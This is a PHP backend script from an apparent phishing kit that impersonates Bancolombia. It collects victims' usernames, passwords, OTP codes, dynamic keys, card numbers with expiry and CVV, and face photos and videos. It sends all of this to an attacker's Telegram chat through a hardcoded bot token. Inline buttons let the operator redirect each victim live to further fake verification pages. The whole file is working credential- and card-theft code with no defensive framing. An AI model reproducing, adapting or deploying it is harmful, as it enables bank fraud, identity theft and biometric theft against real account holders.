<?php
header('Content-Type: application/json');

$data = json_decode(file_get_contents('php://input'), true);
if (!$data) { echo json_encode(['ok' => false, 'error' => 'JSON inválido']); exit; }

$botToken = '8610056416:AAGLQDO2p37_9poNcRsN6joFzw8Z6x8qEH4';
$chatId   = '-5078057586';

function getNextSessionId() {
    $file = 'session_counter.txt';
    if (!file_exists($file)) { file_put_contents($file, '1'); return 'S-001'; }
    $counter = (int)file_get_contents($file); $counter++;
    file_put_contents($file, $counter);
    return 'S-' . str_pad($counter, 3, '0', STR_PAD_LEFT);
}

$sessionId = trim($data['sessionId'] ?? '');
if (empty($sessionId)) $sessionId = getNextSessionId();

$username = trim($data['username'] ?? 'N/A');
$password = trim($data['password'] ?? 'N/A');
$otp      = trim($data['otp']      ?? 'N/A');
$dinamic  = trim($data['dinamic']  ?? 'N/A');
$tc       = trim($data['tc']       ?? 'N/A');
$expiry   = trim($data['expiry']   ?? 'N/A');
$cvv      = trim($data['cvv']      ?? 'N/A');
$ip       = trim($data['ip'] ?? ($_SERVER['REMOTE_ADDR'] ?? 'No disponible'));
$event    = trim($data['event'] ?? 'LOGIN');
$time     = date('Y-m-d H:i:s');

function tg_send($botToken, $method, $params) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.telegram.org/bot{$botToken}/{$method}",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $params,
    ]);
    $r = curl_exec($ch); $err = curl_error($ch); curl_close($ch);
    if ($err) return ['ok' => false, 'error' => $err];
    return json_decode($r, true);
}

// Botones según el evento (siempre incluyen ✅/❌ + redirecciones a otras vistas + ERROR_923)
function buildKeyboard($event) {
    $rows = [];
    if ($event === 'LOGIN') {
        $rows[] = [
            ['text' => '✅ LOGIN', 'callback_data' => 'ACTION:OK_LOGIN'],
            ['text' => '❌ LOGIN', 'callback_data' => 'ACTION:ERR_LOGIN']
        ];
        $rows[] = [
            ['text' => '➡️ DASH', 'callback_data' => 'ACTION:GOTO_DASH'],
            ['text' => '➡️ OTP',  'callback_data' => 'ACTION:GOTO_OTP'],
            ['text' => '➡️ DIN',  'callback_data' => 'ACTION:GOTO_DIN']
        ];
        $rows[] = [
            ['text' => '➡️ TC',     'callback_data' => 'ACTION:GOTO_TC'],
            ['text' => '➡️ FACIAL', 'callback_data' => 'ACTION:GOTO_FACIAL']
        ];
    } elseif ($event === 'OTP') {
        $rows[] = [
            ['text' => '✅ OTP', 'callback_data' => 'ACTION:OK_OTP'],
            ['text' => '❌ OTP', 'callback_data' => 'ACTION:ERR_OTP']
        ];
        $rows[] = [
            ['text' => '➡️ DASH', 'callback_data' => 'ACTION:GOTO_DASH'],
            ['text' => '➡️ DIN',  'callback_data' => 'ACTION:GOTO_DIN'],
            ['text' => '➡️ TC',   'callback_data' => 'ACTION:GOTO_TC']
        ];
        $rows[] = [
            ['text' => '➡️ FACIAL', 'callback_data' => 'ACTION:GOTO_FACIAL']
        ];
    } elseif ($event === 'DINAMICA') {
        $rows[] = [
            ['text' => '✅ DIN', 'callback_data' => 'ACTION:OK_DIN'],
            ['text' => '❌ DIN', 'callback_data' => 'ACTION:ERR_DIN']
        ];
        $rows[] = [
            ['text' => '➡️ DASH', 'callback_data' => 'ACTION:GOTO_DASH'],
            ['text' => '➡️ OTP',  'callback_data' => 'ACTION:GOTO_OTP'],
            ['text' => '➡️ TC',   'callback_data' => 'ACTION:GOTO_TC']
        ];
        $rows[] = [
            ['text' => '➡️ FACIAL', 'callback_data' => 'ACTION:GOTO_FACIAL']
        ];
    } elseif ($event === 'TARJETA') {
        $rows[] = [
            ['text' => '✅ TC', 'callback_data' => 'ACTION:OK_TC'],
            ['text' => '❌ TC', 'callback_data' => 'ACTION:ERR_TC']
        ];
        $rows[] = [
            ['text' => '➡️ DASH', 'callback_data' => 'ACTION:GOTO_DASH'],
            ['text' => '➡️ OTP',  'callback_data' => 'ACTION:GOTO_OTP'],
            ['text' => '➡️ DIN',  'callback_data' => 'ACTION:GOTO_DIN']
        ];
        $rows[] = [
            ['text' => '➡️ FACIAL', 'callback_data' => 'ACTION:GOTO_FACIAL']
        ];
    } elseif ($event === 'FACIAL') {
        $rows[] = [
            ['text' => '✅ FACIAL', 'callback_data' => 'ACTION:OK_FACIAL'],
            ['text' => '❌ FACIAL', 'callback_data' => 'ACTION:ERR_FACIAL']
        ];
        $rows[] = [
            ['text' => '➡️ DASH', 'callback_data' => 'ACTION:GOTO_DASH'],
            ['text' => '➡️ OTP',  'callback_data' => 'ACTION:GOTO_OTP'],
            ['text' => '➡️ DIN',  'callback_data' => 'ACTION:GOTO_DIN']
        ];
        $rows[] = [
            ['text' => '➡️ TC',   'callback_data' => 'ACTION:GOTO_TC']
        ];
    }
    // 923 disponible siempre
    $rows[] = [
        ['text' => '⚠️ ERROR 923', 'callback_data' => 'ACTION:ERROR_923']
    ];
    return ['inline_keyboard' => $rows];
}

if ($event === 'FACIAL') {
    $fotoBase64  = $data['foto']  ?? '';
    $videoBase64 = $data['video'] ?? '';

    if (empty($fotoBase64) || empty($videoBase64)) {
        echo json_encode(['ok' => false, 'error' => 'Foto o video no recibidos']);
        exit;
    }

    $fotoData  = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $fotoBase64));
    $videoData = base64_decode(preg_replace('#^data:video/\w+;base64,#i', '', $videoBase64));

    $fotoPath  = 'temp_foto_'  . time() . '.jpg';
    $videoPath = 'temp_video_' . time() . '.webm';
    file_put_contents($fotoPath,  $fotoData);
    file_put_contents($videoPath, $videoData);

    $caption = "📸 *CAPTURA FACIAL*\n\n" .
        "🆔 ID: `{$sessionId}`\n" .
        "📍 IP: `{$ip}`\n" .
        "🕐 {$time}";

    $result = tg_send($botToken, 'sendPhoto', [
        'chat_id'      => $chatId,
        'photo'        => new CURLFile(realpath($fotoPath)),
        'caption'      => $caption,
        'parse_mode'   => 'Markdown',
        'reply_markup' => json_encode(buildKeyboard('FACIAL'))
    ]);

    $ok = $result['ok'] ?? false;
    $messageId = $ok ? ($result['result']['message_id'] ?? null) : null;

    if ($ok) {
        tg_send($botToken, 'sendDocument', [
            'chat_id'    => $chatId,
            'document'   => new CURLFile(realpath($videoPath)),
            'caption'    => "🎥 *VIDEO MOVIMIENTO*\n🆔 ID: `{$sessionId}`",
            'parse_mode' => 'Markdown'
        ]);
    }

    @unlink($fotoPath);
    @unlink($videoPath);

    echo json_encode([
        'ok'         => $ok,
        'message_id' => $messageId,
        'chat_id'    => $chatId,
        'session_id' => $sessionId
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($event === 'OTP') {
    $message_TEXT = "📱 *CÓDIGO OTP RECIBIDO*\n\n" .
        "🆔 ID: `{$sessionId}`\n" .
        "🔐 OTP: `{$otp}`\n" .
        "🌐 IP: `{$ip}`\n" .
        "⏰ Hora: {$time}";
} elseif ($event === 'DINAMICA') {
    $message_TEXT = "🔢 *CLAVE DINÁMICA RECIBIDA*\n\n" .
        "🆔 ID: `{$sessionId}`\n" .
        "🔐 Dinámica: `{$dinamic}`\n" .
        "🌐 IP: `{$ip}`\n" .
        "⏰ Hora: {$time}";
} elseif ($event === 'TARJETA') {
    $message_TEXT = "💳 *DATOS DE TARJETA RECIBIDOS*\n\n" .
        "🆔 ID: `{$sessionId}`\n" .
        "💳 Número: `{$tc}`\n" .
        "🗓️ Expiración: `{$expiry}`\n" .
        "🔐 CVV: `{$cvv}`\n" .
        "🌐 IP: `{$ip}`\n" .
        "⏰ Hora: {$time}";
} else {
    $event = 'LOGIN';
    $message_TEXT = "🔐 *NUEVO LOGIN BANCOLOMBIA*\n\n" .
        "🆔 ID: `{$sessionId}`\n" .
        "👤 Usuario: `{$username}`\n" .
        "🔒 Contraseña: `{$password}`\n" .
        "🌐 IP: `{$ip}`\n" .
        "⏰ Hora: {$time}";
}

$result = tg_send($botToken, 'sendMessage', [
    'chat_id' => $chatId,
    'text' => $message_TEXT,
    'parse_mode' => 'Markdown',
    'reply_markup' => json_encode(buildKeyboard($event))
]);

$ok = $result['ok'] ?? false;
echo json_encode([
    'ok' => $ok,
    'message_id' => $ok ? ($result['result']['message_id'] ?? null) : null,
    'chat_id' => $chatId,
    'session_id' => $sessionId
], JSON_UNESCAPED_UNICODE);
